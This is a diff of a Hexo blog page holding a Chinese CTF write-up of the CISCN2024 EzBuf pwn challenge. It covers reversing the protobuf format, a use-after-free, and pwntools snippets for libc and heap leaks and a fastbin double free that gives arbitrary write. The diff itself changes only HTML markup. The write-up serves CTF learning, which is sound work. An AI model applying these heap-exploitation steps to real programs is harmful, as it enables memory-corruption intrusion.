@@ -19,12 +19,12 @@
         <meta name="keywords" content="hexo,hexo-theme,hexo-blog,blog,pwn,heap,wp">
     
     <meta name="description" content="">
-    <meta name="description" content="题目分析 到手一拖史不知道是什么，逆向扣了符号表，很多函数根本看不懂。  字符串交叉引用到主函数，发现首先是开沙箱（这里第一次没注意到没有load规则是个假的沙箱但是本来也没办法就没管）。 主函数： 1234567891011121314151617181920212223void __fastcall __noreturn main(__int64 a1, char **a2, char **a">
+    <meta name="description" content="题目分析  到手一拖史不知道是什么，逆向扣了符号表，很多函数根本看不懂。  字符串交叉引用到主函数，发现首先是开沙箱（这里第一次没注意到没有load规则是个假的沙箱但是本来也没办法就没管）。 主函数： 1234567891011121314151617181920212223void __fastcall __noreturn main(__int64 a1, char **a2, char **">
 <meta property="og:type" content="article">
 <meta property="og:title" content="How2Heap&amp;Protobuf实战——CISCN2024EzBuf">
 <meta property="og:url" content="http://example.com/2024/09/05/How2Heap-Protobuf%E5%AE%9E%E6%88%98%E2%80%94%E2%80%94CISCN2024EzBuf/index.html">
 <meta property="og:site_name" content="Hexo">
-<meta property="og:description" content="题目分析 到手一拖史不知道是什么，逆向扣了符号表，很多函数根本看不懂。  字符串交叉引用到主函数，发现首先是开沙箱（这里第一次没注意到没有load规则是个假的沙箱但是本来也没办法就没管）。 主函数： 1234567891011121314151617181920212223void __fastcall __noreturn main(__int64 a1, char **a2, char **a">
+<meta property="og:description" content="题目分析  到手一拖史不知道是什么，逆向扣了符号表，很多函数根本看不懂。  字符串交叉引用到主函数，发现首先是开沙箱（这里第一次没注意到没有load规则是个假的沙箱但是本来也没办法就没管）。 主函数： 1234567891011121314151617181920212223void __fastcall __noreturn main(__int64 a1, char **a2, char **">
 <meta property="og:locale" content="en_US">
 <meta property="article:published_time" content="2024-09-05T10:52:39.000Z">
 <meta property="article:modified_time" content="2024-11-17T07:40:13.096Z">
@@ -498,7 +498,8 @@
             <div class="container container-unloaded">
                 <main class="main post-page">
     <article class="article-entry">
-        <h1 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h1><blockquote>
+        <h1>题目分析</h1>
+<blockquote>
 <p>到手一拖史不知道是什么，逆向扣了符号表，很多函数根本看不懂。</p>
 </blockquote>
 <p>字符串交叉引用到主函数，发现首先是开沙箱（这里第一次没注意到没有load规则是个假的沙箱但是本来也没办法就没管）。</p>
@@ -508,7 +509,8 @@
 <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">setbuf(<span class="built_in">stdin</span>, <span class="number">0LL</span>);</span><br><span class="line">setbuf(<span class="built_in">stdout</span>, <span class="number">0LL</span>);</span><br><span class="line">setbuf(<span class="built_in">stderr</span>, <span class="number">0LL</span>);</span><br><span class="line">seccomp_rules = seccomp_init(<span class="number">2147418112LL</span>);</span><br><span class="line">seccomp_rule_add(seccomp_rules, <span class="number">0LL</span>, <span class="number">257LL</span>, <span class="number">0LL</span>);</span><br><span class="line">seccomp_rule_add(seccomp_rules, <span class="number">0LL</span>, <span class="number">19LL</span>, <span class="number">0LL</span>);</span><br><span class="line">seccomp_rule_add(seccomp_rules, <span class="number">0LL</span>, <span class="number">20LL</span>, <span class="number">0LL</span>);</span><br><span class="line">seccomp_rule_add(seccomp_rules, <span class="number">0LL</span>, <span class="number">0LL</span>, <span class="number">0LL</span>);</span><br><span class="line">seccomp_rule_add(seccomp_rules, <span class="number">0LL</span>, <span class="number">17LL</span>, <span class="number">0LL</span>);</span><br><span class="line">seccomp_rule_add(seccomp_rules, <span class="number">0LL</span>, <span class="number">18LL</span>, <span class="number">0LL</span>);</span><br><span class="line">seccomp_rule_add(seccomp_rules, <span class="number">0LL</span>, <span class="number">59LL</span>, <span class="number">0LL</span>);</span><br><span class="line">seccomp_rule_add(seccomp_rules, <span class="number">0LL</span>, <span class="number">303LL</span>, <span class="number">0LL</span>);</span><br><span class="line">seccomp_rule_add(seccomp_rules, <span class="number">0LL</span>, <span class="number">304LL</span>, <span class="number">0LL</span>);</span><br><span class="line">seccomp_rule_add(seccomp_rules, <span class="number">0LL</span>, <span class="number">322LL</span>, <span class="number">0LL</span>);</span><br><span class="line">seccomp_rule_add(seccomp_rules, <span class="number">0LL</span>, <span class="number">327LL</span>, <span class="number">0LL</span>);</span><br><span class="line">seccomp_rule_add(seccomp_rules, <span class="number">0LL</span>, <span class="number">328LL</span>, <span class="number">0LL</span>);</span><br><span class="line">seccomp_rule_add(seccomp_rules, <span class="number">0LL</span>, <span class="number">428LL</span>, <span class="number">0LL</span>);</span><br><span class="line">seccomp_rule_add(seccomp_rules, <span class="number">0LL</span>, <span class="number">437LL</span>, <span class="number">0LL</span>);</span><br><span class="line">seccomp_rule_add(seccomp_rules, <span class="number">0LL</span>, <span class="number">327LL</span>, <span class="number">0LL</span>);</span><br><span class="line">seccomp_rule_add(seccomp_rules, <span class="number">0LL</span>, <span class="number">296LL</span>, <span class="number">0LL</span>);</span><br><span class="line">seccomp_rule_add(seccomp_rules, <span class="number">0LL</span>, <span class="number">295LL</span>, <span class="number">0LL</span>);</span><br><span class="line">buf = (<span class="type">char</span> *)<span class="built_in">malloc</span>(<span class="number">0x410</span>uLL);</span><br><span class="line"><span class="keyword">return</span> <span class="built_in">malloc</span>(<span class="number">0x410</span>uLL);</span><br></pre></td></tr></table></figure>
 <p>输入没有提示直接报错，看下面的函数，read我们的输入之后把我们的输入传入了一个神秘函数，完全看不懂。但是内部真正调用的函数指针有一个写好的参数，里面有点奇怪的字符串，heybro之类的：</p>
 <p>到这其实就进行不下去了，下面的函数能猜到是菜单但是参数十分混乱，看不懂，遂上网搜索。</p>
-<h1 id="Protobuf"><a href="#Protobuf" class="headerlink" title="Protobuf"></a>Protobuf</h1><p>这个程序使用了谷歌开发的一种叫做protobuf的序列化协议进行交互的。参考看雪上<a target="_blank" rel="noopener" href="https://bbs.kanxue.com/thread-282203.htm">这篇文章</a>（讲的很详细，一篇够了）。protobuf是一种类似json的数据流格式，通过.proto文件定义好结构体后借助protoc编译，能将其自动转成各种语言的头文件（内含接口，包括C，python，go等等）供开发使用，还是挺方便的。文章中提到了ciscn2024这道题目，那么我们首先的任务就是逆向出protobuf结构体。</p>
+<h1>Protobuf</h1>
+<p>这个程序使用了谷歌开发的一种叫做protobuf的序列化协议进行交互的。参考看雪上<a target="_blank" rel="noopener" href="https://bbs.kanxue.com/thread-282203.htm">这篇文章</a>（讲的很详细，一篇够了）。protobuf是一种类似json的数据流格式，通过.proto文件定义好结构体后借助protoc编译，能将其自动转成各种语言的头文件（内含接口，包括C，python，go等等）供开发使用，还是挺方便的。文章中提到了ciscn2024这道题目，那么我们首先的任务就是逆向出protobuf结构体。</p>
 <blockquote>
 <p>这里还了解到ida其实是有插件的，也有一些别的工具能识别二进制文件里的protobuf结构，但是我都尝试了都分析不了（看到别的师傅的wp也是如此，都是手动分析的）</p>
 </blockquote>
@@ -521,76 +523,118 @@
 <p>label类似于数据库的限制条件，允许为空，允许重复，必须填值这种。其实label也不太重要，我们逆向全写optional就行。</p>
 <p>在IDA中写好这几个localtype后，定位文件中的结构体并进行还原。可以知道heybro有5个字段，直接写好我们的proto文件：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">syntax=&quot;proto2&quot;;</span><br><span class="line"></span><br><span class="line">message heybro&#123;</span><br><span class="line">    optional bytes whatcon = 1;</span><br><span class="line">    optional sint64 whattodo = 2;</span><br><span class="line">    optional sint64  whatidx = 3;</span><br><span class="line">    optional sint64 whatsize = 4;</span><br><span class="line">    optional uint32 whatsthis = 5;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>然后<code>protoc --python_out=. proto_buf.proto</code>编译成python文件直接用。<br>以add为例，简单好用</p>
+<p>然后<code>protoc --python_out=. proto_buf.proto</code>编译成python文件直接用。<br>
+以add为例，简单好用</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> proto_buf_pb2.py</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">idx,data</span>):</span><br><span class="line">    chunk = proto_buf_pb2.heybro()</span><br><span class="line">    chunk.whatcon = data</span><br><span class="line">    chunk.whattodo = <span class="number">1</span></span><br><span class="line">    chunk.whatidx = idx</span><br><span class="line">    chunk.whatsize = <span class="number">0</span></span><br><span class="line">    chunk.whatsthis = <span class="number">0</span></span><br><span class="line">    p.sendafter(<span class="string">&quot;WANT?\n&quot;</span>,chunk.SerializeToString())</span><br></pre></td></tr></table></figure>
-<h1 id="程序控制流"><a href="#程序控制流" class="headerlink" title="程序控制流"></a>程序控制流</h1><p>分析出这几个字段之后，main函数里面调用的不知所云的函数就直接猜测是翻译字节流还原的了，下面参数混乱的菜单函数也不用管参数，对着选项结合heybro的字段名大概能猜出来：</p>
+<h1>程序控制流</h1>
+<p>分析出这几个字段之后，main函数里面调用的不知所云的函数就直接猜测是翻译字节流还原的了，下面参数混乱的菜单函数也不用管参数，对着选项结合heybro的字段名大概能猜出来：</p>
 <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> __fastcall <span class="title function_">menu</span><span class="params">(__int64 a1, <span class="type">void</span> *whatcon, __int64 whattodo, __int64 whatidx, __int64 whatsize, <span class="type">int</span> whatsthis)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">switch</span> ( whattodo )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">0LL</span>:</span><br><span class="line">      nop();</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">1LL</span>:</span><br><span class="line">      add(whatidx, a1, whatcon);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">2LL</span>:</span><br><span class="line">      delete(whatidx);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">3LL</span>:</span><br><span class="line">      show(whatidx, whatsthis, whatsize, a1, (<span class="type">char</span> *)whatcon);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">4LL</span>:</span><br><span class="line">      _exit(<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;what?\n&quot;</span>);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 <p>菜单的功能也比较怪异。。</p>
-<h2 id="add"><a href="#add" class="headerlink" title="add"></a>add</h2><p>malloc固定大小0x30的chunk，然后从buf memcpy0x30字节的内容到堆块中。堆指针维护在一个数组里，最大申请idx为8，但是大于8也允许操作，只是idx重置到8.<br>另外这意味着我们没有largebin的利用了。</p>
+<h2 id="add">add</h2>
+<p>malloc固定大小0x30的chunk，然后从buf memcpy0x30字节的内容到堆块中。堆指针维护在一个数组里，最大申请idx为8，但是大于8也允许操作，只是idx重置到8.<br>
+另外这意味着我们没有largebin的利用了。</p>
 <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> *__fastcall <span class="title function_">add</span><span class="params">(<span class="type">unsigned</span> <span class="type">int</span> idx, __int64 a2, <span class="type">const</span> <span class="type">void</span> *whatcon)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> idx_rel; <span class="comment">// [rsp+2Ch] [rbp-4h]</span></span><br><span class="line">  idx_rel = idx;</span><br><span class="line">  <span class="keyword">if</span> ( idx &gt; <span class="number">8</span> )</span><br><span class="line">    idx_rel = <span class="number">8</span>;</span><br><span class="line">  chunks[idx_rel] = <span class="built_in">malloc</span>(<span class="number">0x30</span>uLL);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">memcpy</span>((<span class="type">void</span> *)chunks[idx_rel], whatcon, <span class="number">0x30</span>uLL);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
 <blockquote>
 <p>这里有个漏洞点静态分析可能看不出，无论content传入什么长度的内容，它都会copy 0x30字节。这意味着我们如果输入很短的内容可能会把别的脏东西copy到我们的堆块上。事实证明确实是这样。</p>
 </blockquote>
-<h2 id="delete"><a href="#delete" class="headerlink" title="delete"></a>delete</h2><p>传入idx进行free，只允许我们释放10次，指针没置空有UAF。但是菜单没有edit功能所以只能用来泄露。</p>
+<h2 id="delete">delete</h2>
+<p>传入idx进行free，只允许我们释放10次，指针没置空有UAF。但是菜单没有edit功能所以只能用来泄露。</p>
 <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">delete</span><span class="params">(<span class="type">unsigned</span> <span class="type">int</span> idx)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="type">unsigned</span> <span class="type">int</span>)free_cnt &gt; <span class="number">9</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;No chance!&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( idx &gt; <span class="number">8</span> || !chunks[idx] )</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;OOPS!&quot;</span>);</span><br><span class="line">  <span class="built_in">free</span>((<span class="type">void</span> *)chunks[idx]);</span><br><span class="line">  <span class="keyword">return</span> ++free_cnt;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 <blockquote>
 <p>其实搞懂了之后回来看，只能说释放10次加0x40大小堆块已经有点暗示填满tcache+3次fastbin dup了</p>
 </blockquote>
-<h2 id="show"><a href="#show" class="headerlink" title="show"></a>show</h2><p>这个函数是最抽象的，下面看看它干了什么</p>
+<h2 id="show">show</h2>
+<p>这个函数是最抽象的，下面看看它干了什么</p>
 <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 __fastcall <span class="title function_">show_edit</span><span class="params">(<span class="type">unsigned</span> <span class="type">int</span> whatidx, <span class="type">int</span> whatsthis, __int64 whatsize, __int64 a4, <span class="type">char</span> *whatcon)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> delim; <span class="comment">// [rsp+33h] [rbp-1Dh] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> idx; <span class="comment">// [rsp+34h] [rbp-1Ch]</span></span><br><span class="line">  <span class="type">char</span> *chunk_ptr; <span class="comment">// [rsp+38h] [rbp-18h]</span></span><br><span class="line">  <span class="type">char</span> fake_ptr_on_stack[<span class="number">15</span>]; <span class="comment">// [rsp+41h] [rbp-Fh] BYREF</span></span><br><span class="line"></span><br><span class="line">  *(_QWORD *)&amp;fake_ptr_on_stack[<span class="number">7</span>] = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  idx = whatidx;</span><br><span class="line">  delim = whatsthis;</span><br><span class="line">  <span class="built_in">strcpy</span>(fake_ptr_on_stack, <span class="string">&quot;hahaha&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( whatidx &lt;= <span class="number">8</span> &amp;&amp; chunks[idx] )</span><br><span class="line">    chunk_ptr = (<span class="type">char</span> *)chunks[idx];</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    chunk_ptr = fake_ptr_on_stack;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Content:&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( whatsthis == <span class="number">0xFF</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    seccomp_load(seccomp_rules);</span><br><span class="line">    strtok(whatcon, &amp;delim);</span><br><span class="line">    chunk_ptr = strtok(<span class="number">0LL</span>, &amp;delim);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( whatsize == <span class="number">0x30</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    strtok(buf, &amp;delim);</span><br><span class="line">    chunk_ptr = strtok(<span class="number">0LL</span>, &amp;delim);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>, chunk_ptr);</span><br><span class="line">  <span class="built_in">free</span>(buf);</span><br><span class="line">  <span class="keyword">if</span> ( ++show_cnt == <span class="number">3</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    close(<span class="number">1</span>);</span><br><span class="line">    close(<span class="number">2</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> *(_QWORD *)&amp;fake_ptr_on_stack[<span class="number">7</span>] - __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<ul>
-<li>首先，只允许我们打印两次，到3就会关闭stdout和stderr就没法交互了</li>
-<li>正常泄露的话，它就会<code>printf(&quot;%s&quot;,chunk)</code></li>
-<li>如果whatsthis附加为0xff，这里就会装载沙箱然后调用strtok分割whatcon域，很莫名其妙的操作</li>
-<li>如果whatsize附加为0x30，这里也会调用strtok，只不过是分割buf（buf也很乱后面再提）</li>
-<li>输出完之后会free掉buf</li>
+<ul class="lvl-0">
+<li class="lvl-2">
+<p>首先，只允许我们打印两次，到3就会关闭stdout和stderr就没法交互了</p>
+</li>
+<li class="lvl-2">
+<p>正常泄露的话，它就会<code>printf(&quot;%s&quot;,chunk)</code></p>
+</li>
+<li class="lvl-2">
+<p>如果whatsthis附加为0xff，这里就会装载沙箱然后调用strtok分割whatcon域，很莫名其妙的操作</p>
+</li>
+<li class="lvl-2">
+<p>如果whatsize附加为0x30，这里也会调用strtok，只不过是分割buf（buf也很乱后面再提）</p>
+</li>
+<li class="lvl-2">
+<p>输出完之后会free掉buf</p>
+</li>
 </ul>
 <blockquote>
 <p>事实上到最后也没用到这上面的分支</p>
 </blockquote>
-<h2 id="沙箱"><a href="#沙箱" class="headerlink" title="沙箱"></a>沙箱</h2><p>函数都是死的，交给copilot。前面提到的这个沙箱ban了execve，允许了orw，mprotect，文件描述符复制还有一些别的乱七八糟的东西。其实不用管，只要whatsize不传0xFF它就不会装载。</p>
-<h2 id="堆块的操作？"><a href="#堆块的操作？" class="headerlink" title="堆块的操作？"></a>堆块的操作？</h2><p>首先，buf这个字段是乱用的。动调断在malloc可以发现，主函数的一个循环会默认有这么几个操作：</p>
+<h2 id="沙箱">沙箱</h2>
+<p>函数都是死的，交给copilot。前面提到的这个沙箱ban了execve，允许了orw，mprotect，文件描述符复制还有一些别的乱七八糟的东西。其实不用管，只要whatsize不传0xFF它就不会装载。</p>
+<h2 id="堆块的操作？">堆块的操作？</h2>
+<p>首先，buf这个字段是乱用的。动调断在malloc可以发现，主函数的一个循环会默认有这么几个操作：</p>
 <ol>
-<li>malloc(0x48) 一轮循环开头固定</li>
-<li>malloc(len(content)+3)</li>
-<li>malloc(0x30) -&gt; 我们能读的</li>
-<li>malloc(0x200) 一轮循环结尾固定<br>更不要提各种的free。我们能控制的非常有限，但是0x40的fastbin和tcache都是纯净的可以供我们利用。</li>
+<li class="lvl-3">
+<p>malloc(0x48) 一轮循环开头固定</p>
+</li>
+<li class="lvl-3">
+<p>malloc(len(content)+3)</p>
+</li>
+<li class="lvl-3">
+<p>malloc(0x30) -&gt; 我们能读的</p>
+</li>
+<li class="lvl-3">
+<p>malloc(0x200) 一轮循环结尾固定更不要提各种的free。我们能控制的非常有限，但是0x40的fastbin和tcache都是纯净的可以供我们利用。</p>
+</li>
 </ol>
-<h1 id="攻击"><a href="#攻击" class="headerlink" title="攻击"></a>攻击</h1><p>思路参考自<a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/14709%EF%BC%8C%E5%8F%A6%E5%A4%96%E7%9C%8B%E5%88%B0%E6%9C%89%E5%B8%88%E5%82%85[%E7%94%A8obstack%E6%89%93](https://rot-will.github.io/page/wp/2024ciscn%E5%88%9D%E8%B5%9Bwp-pwn/#ezbuf)%EF%BC%8C%E4%BD%86%E6%98%AF%E6%88%91python%E7%BC%BA%E5%BA%93%E4%B9%9F%E6%B2%A1%E6%9C%89%E4%BB%8B%E7%BB%8D%E4%B9%9F%E7%9C%8B%E4%B8%8D%E6%87%82%E6%80%8E%E4%B9%88%E6%89%93%E7%9A%84%E5%B0%B1%E4%B8%8D%E6%8F%90%E4%BA%86">https://xz.aliyun.com/t/14709，另外看到有师傅[用obstack打](https://rot-will.github.io/page/wp/2024ciscn%E5%88%9D%E8%B5%9Bwp-pwn/#ezbuf)，但是我python缺库也没有介绍也看不懂怎么打的就不提了</a></p>
-<h2 id="泄露——tcache和fastbin指针加密"><a href="#泄露——tcache和fastbin指针加密" class="headerlink" title="泄露——tcache和fastbin指针加密"></a>泄露——tcache和fastbin指针加密</h2><p>我们只能泄露两个地址，必然是一个堆一个libc。堆可以通过tcache泄露，libc的泄露比较神奇，上面提到了memcpy可能存在的复制脏数据问题，这里其实<code>add(0,b&#39;a&#39;*8)</code>再读就能发现了，里面是一个main_arena的libc地址，具体的堆排布也没有细看，反正偏移肯定是固定的直接打出来就行。</p>
+<h1>攻击</h1>
+<p>思路参考自<a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/14709%EF%BC%8C%E5%8F%A6%E5%A4%96%E7%9C%8B%E5%88%B0%E6%9C%89%E5%B8%88%E5%82%85%5B%E7%94%A8obstack%E6%89%93%5D(https://rot-will.github.io/page/wp/2024ciscn%E5%88%9D%E8%B5%9Bwp-pwn/#ezbuf)%EF%BC%8C%E4%BD%86%E6%98%AF%E6%88%91python%E7%BC%BA%E5%BA%93%E4%B9%9F%E6%B2%A1%E6%9C%89%E4%BB%8B%E7%BB%8D%E4%B9%9F%E7%9C%8B%E4%B8%8D%E6%87%82%E6%80%8E%E4%B9%88%E6%89%93%E7%9A%84%E5%B0%B1%E4%B8%8D%E6%8F%90%E4%BA%86">https://xz.aliyun.com/t/14709，另外看到有师傅[用obstack打](https://rot-will.github.io/page/wp/2024ciscn初赛wp-pwn/#ezbuf)，但是我python缺库也没有介绍也看不懂怎么打的就不提了</a></p>
+<h2 id="泄露——tcache和fastbin指针加密">泄露——tcache和fastbin指针加密</h2>
+<p>我们只能泄露两个地址，必然是一个堆一个libc。堆可以通过tcache泄露，libc的泄露比较神奇，上面提到了memcpy可能存在的复制脏数据问题，这里其实<code>add(0,b'a'*8)</code>再读就能发现了，里面是一个main_arena的libc地址，具体的堆排布也没有细看，反正偏移肯定是固定的直接打出来就行。</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">8</span>) <span class="comment"># 0</span></span><br><span class="line">show(<span class="number">0</span>) <span class="comment"># 1次泄露libc</span></span><br><span class="line">p.recvuntil(<span class="string">b&#x27;aaaaaaaa&#x27;</span>)</span><br><span class="line">libc.address = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))-<span class="number">0x21ace0</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;[+] libc_addr=<span class="subst">&#123;<span class="built_in">hex</span>(libc.address)&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure>
 <p>在glibc 2.32之后，tcache和fastbin都对指针进行了加密，原理是原本的指针异或上堆当前页地址右移12位。因此泄露不能随便打，堆地址要泄露tcache头部的块来获得key，因为第一次链入的时候是异或全0的。</p>
 <p>这里结合动调来确认指针内容和堆排布。</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">9</span>):</span><br><span class="line">    add(i+<span class="number">1</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">8</span>) <span class="comment"># 1-6</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>): <span class="comment"># 7/10</span></span><br><span class="line">    delete(<span class="number">6</span>-i)</span><br><span class="line"></span><br><span class="line"><span class="comment"># tcache 0x40: 0 1 2 3 4 5 6</span></span><br><span class="line">show(<span class="number">6</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;Content:&#x27;</span>)</span><br><span class="line">heap = (u64(p.recv(<span class="number">5</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))&lt;&lt;<span class="number">12</span>)-<span class="number">0x4000</span><span class="comment"># 填满后走fastbin吧</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;[+]heap_addr: <span class="subst">&#123;<span class="built_in">hex</span>(heap)&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure>
-<h2 id="fastbin-dup"><a href="#fastbin-dup" class="headerlink" title="fastbin dup"></a>fastbin dup</h2><p>填满tcache之后接下来我们还剩三次free，很难忍得住不用fastbin double free。简单好用任意地址写。</p>
+<h2 id="fastbin-dup">fastbin dup</h2>
+<p>填满tcache之后接下来我们还剩三次free，很难忍得住不用fastbin double free。简单好用任意地址写。</p>
 <blockquote>
 <p>没有edit溢出，chunk内容用memcpy实现大小锁死。也只能这样了。这里可能还有利用程序中其他malloc去布局的方法，但是有点太困难了。</p>
 </blockquote>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># fastbin dup 任意地址写</span></span><br><span class="line">delete(<span class="number">7</span>)</span><br><span class="line">delete(<span class="number">8</span>)</span><br><span class="line">delete(<span class="number">7</span>)<span class="comment"># 10/10</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    add(i,<span class="string">b&#x27;a&#x27;</span>*<span class="number">8</span>) <span class="comment"># tcache取回，让我们从fastbin分配chunk</span></span><br><span class="line"></span><br><span class="line">fastkey=(heap&gt;&gt;<span class="number">12</span>)+<span class="number">4</span> <span class="comment"># 泄露fastbin的POS key，这里是堆基址加上0x4000</span></span><br></pre></td></tr></table></figure>
